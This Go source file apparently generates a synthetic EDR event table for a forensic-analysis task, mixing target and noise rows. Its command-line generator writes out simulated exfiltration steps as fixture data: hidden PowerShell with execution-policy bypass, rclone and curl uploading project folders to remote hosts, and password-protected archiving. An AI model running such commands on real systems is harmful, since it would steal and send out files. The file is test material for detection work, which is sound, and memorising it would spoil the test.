package main

import (
	"fmt"
	"math/rand"
	"sort"
	"strings"
	"time"
)

// event is one row of the stub's EDR table. RemoteIP "" is SQL NULL.
type event struct {
	EventID     string
	EventTime   time.Time
	Host        string
	Account     string
	Process     string
	SHA256      string
	RemoteIP    string
	BytesOut    int64
	CommandLine string
}

const (
	targetHost = "WS-0142"
	seed       = 20261028
	// targetRows is how many rows match the task's host and hour; noise
	// rows (other hosts, other hours) make the filter matter.
	targetRows = 60
	noiseRows  = 240
)

var windowStart = time.Date(2026, 10, 28, 1, 0, 0, 0, time.UTC)

type procSpec struct {
	name     string
	versions int
	network  bool
	minBytes int64
	maxBytes int64
}

var procs = []procSpec{
	{"powershell.exe", 2, true, 2_000, 400_000},
	{"rclone.exe", 1, true, 50_000_000, 900_000_000},
	{"svchost.exe", 2, false, 0, 0},
	{"chrome.exe", 2, true, 10_000, 2_000_000},
	{"OneDrive.exe", 1, true, 100_000, 30_000_000},
	{"curl.exe", 1, true, 1_000, 5_000_000},
	{"7z.exe", 1, false, 0, 0},
	{"conhost.exe", 1, false, 0, 0},
}

var accounts = []string{`CORP\k.tanaka`, `CORP\svc_backup`, `NT AUTHORITY\SYSTEM`}

// The remote addresses are drawn from the three documentation ranges
// only, so the scorer can tell a data address from any other dotted quad.
var ipPrefixes = []string{"192.0.2.", "198.51.100.", "203.0.113."}

var projectNames = []string{"keiri-2026", "hanbai-plan", "jinji-hyouka", "torihiki-list", "gijutsu-spec"}

// dataset returns the whole table: the target rows first in time order,
// then the noise. It is deterministic — every run sees the same table.
func dataset() []event {
	r := rand.New(rand.NewSource(seed))
	hex := func(n int) string {
		const h = "0123456789abcdef"
		b := make([]byte, n)
		for i := range b {
			b[i] = h[r.Intn(16)]
		}
		return string(b)
	}
	hashes := map[string][]string{}
	for _, p := range procs {
		for v := 0; v < p.versions; v++ {
			hashes[p.name] = append(hashes[p.name], hex(64))
		}
	}
	ips := make([]string, 0, 14)
	for len(ips) < 14 {
		ip := fmt.Sprintf("%s%d", ipPrefixes[r.Intn(len(ipPrefixes))], 2+r.Intn(250))
		dup := false
		for _, x := range ips {
			dup = dup || x == ip
		}
		if !dup {
			ips = append(ips, ip)
		}
	}
	ids := map[string]bool{}
	one := func(host string, at time.Time) event {
		p := procs[r.Intn(len(procs))]
		id := "evt-" + hex(12)
		for ids[id] {
			id = "evt-" + hex(12)
		}
		ids[id] = true
		e := event{
			EventID:   id,
			EventTime: at,
			Host:      host,
			Account:   accounts[r.Intn(len(accounts))],
			Process:   p.name,
			SHA256:    hashes[p.name][r.Intn(len(hashes[p.name]))],
		}
		if p.name == "svchost.exe" || p.name == "conhost.exe" {
			e.Account = `NT AUTHORITY\SYSTEM`
		}
		if p.network {
			e.RemoteIP = ips[r.Intn(len(ips))]
			e.BytesOut = p.minBytes + r.Int63n(p.maxBytes-p.minBytes)
		}
		e.CommandLine = commandLine(r, hex, e)
		return e
	}
	var target []event
	for i := 0; i < targetRows; i++ {
		at := windowStart.Add(time.Duration(r.Int63n(int64(time.Hour/time.Microsecond))) * time.Microsecond)
		target = append(target, one(targetHost, at))
	}
	sort.Slice(target, func(i, j int) bool { return target[i].EventTime.Before(target[j].EventTime) })
	all := target
	for i := 0; i < noiseRows; i++ {
		var host string
		var at time.Time
		if r.Intn(3) == 0 {
			// Same host, outside the hour.
			host = targetHost
			off := time.Duration(r.Int63n(int64(3*time.Hour/time.Microsecond))) * time.Microsecond
			if r.Intn(2) == 0 {
				at = windowStart.Add(-off - time.Microsecond)
			} else {
				at = windowStart.Add(time.Hour + off)
			}
		} else {
			host = fmt.Sprintf("WS-%04d", 100+r.Intn(80))
			if host == targetHost {
				host = "WS-0177"
			}
			at = windowStart.Add(time.Duration(r.Int63n(int64(4*time.Hour/time.Microsecond)))*time.Microsecond - time.Hour)
		}
		all = append(all, one(host, at))
	}
	return all
}

func commandLine(r *rand.Rand, hex func(int) string, e event) string {
	proj := projectNames[r.Intn(len(projectNames))]
	user := "k.tanaka"
	switch e.Process {
	case "powershell.exe":
		return fmt.Sprintf(`powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\%s\AppData\Local\Temp\%s.ps1 -Target \\FS01\share\%s -Since 2026-10-27`, user, hex(8), proj)
	case "rclone.exe":
		return fmt.Sprintf(`"C:\ProgramData\rc\rclone.exe" copy "C:\Users\%s\Documents\Projects\%s" r2:bk-0142/2026-10-28/%s --transfers 8 --bwlimit 0 --no-check-certificate --log-file C:\ProgramData\rc\log_%s.txt`, user, proj, hex(6), hex(4))
	case "svchost.exe":
		return `C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule`
	case "chrome.exe":
		return fmt.Sprintf(`"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --lang=ja --field-trial-handle=%d,i,%s,%s,262144 --renderer-client-id=%d /prefetch:1`, 1900+r.Intn(500), strings.ToUpper(hex(16)), strings.ToUpper(hex(16)), 5+r.Intn(60))
	case "OneDrive.exe":
		return fmt.Sprintf(`"C:\Users\%s\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background /sync-session %s`, user, hex(10))
	case "curl.exe":
		return fmt.Sprintf(`curl.exe -s -k -X POST https://%s/upload -F "f=@C:\Users\%s\Documents\Projects\%s.zip" -H "X-Id: %s"`, e.RemoteIP, user, proj, hex(8))
	case "7z.exe":
		return fmt.Sprintf(`"C:\Program Files\7-Zip\7z.exe" a -tzip -mx=1 -p%s C:\Users\%s\AppData\Local\Temp\%s.zip "C:\Users\%s\Documents\Projects\%s\*"`, hex(10), user, proj, user, proj)
	default:
		return `\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1`
	}
}

// columns is the table's schema in BigQuery terms, in table order.
type column struct {
	Name, Type, Mode, Description string
}

func columns(wide bool) []column {
	c := []column{
		{"event_id", "STRING", "REQUIRED", "Unique event identifier assigned by the EDR sensor."},
		{"event_time", "TIMESTAMP", "REQUIRED", "When the process started (UTC)."},
		{"host", "STRING", "REQUIRED", "Endpoint host name."},
		{"account", "STRING", "NULLABLE", "Account the process ran as (DOMAIN\\user)."},
		{"process_name", "STRING", "NULLABLE", "Image file name of the process."},
		{"sha256", "STRING", "NULLABLE", "SHA-256 of the process image."},
		{"remote_ip", "STRING", "NULLABLE", "Remote address of the process's first outbound connection, if any."},
		{"bytes_out", "INTEGER", "NULLABLE", "Bytes the process sent to remote_ip."},
	}
	if wide {
		c = append(c, column{"command_line", "STRING", "NULLABLE", "Full command line of the process."})
	}
	return c
}

// sqliteTime is how event_time is stored for SQLite: fixed-width, so
// string comparison is time comparison.
const sqliteTime = "2006-01-02T15:04:05.000000"
